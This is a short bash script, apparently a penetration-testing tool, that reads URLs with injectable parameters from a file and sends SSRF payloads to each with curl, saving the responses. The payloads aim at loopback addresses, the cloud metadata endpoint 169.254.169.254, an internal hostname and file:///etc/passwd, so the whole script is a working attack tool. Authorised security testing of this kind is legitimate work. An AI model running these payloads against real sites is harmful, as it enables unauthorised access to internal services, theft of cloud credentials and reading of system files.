#!/bin/bash
echo "🌐 SSRF Payload Tester - Detecting Internal Access via URLs"

mkdir -p ssrf_results

if [[ ! -f ssrf_targets.txt ]]; then
  echo "Missing ssrf_targets.txt. Provide URLs with injectable parameters, e.g., https://site.com?url="
  exit 1
fi

PAYLOADS=("http://127.0.0.1" "http://localhost" "http://169.254.169.254" "file:///etc/passwd" "http://internal.service")

while read -r base; do
  echo "Target: $base"
  for payload in "${PAYLOADS[@]}"; do
    url="${base}${payload}"
    echo "Testing $url"
    curl -s -o "ssrf_results/$(echo $payload | md5sum | cut -d' ' -f1).txt" -w "[%{http_code}] $url\n" "$url"
  done
done < ssrf_targets.txt

echo "SSRF testing completed. Results saved in ssrf_results/"
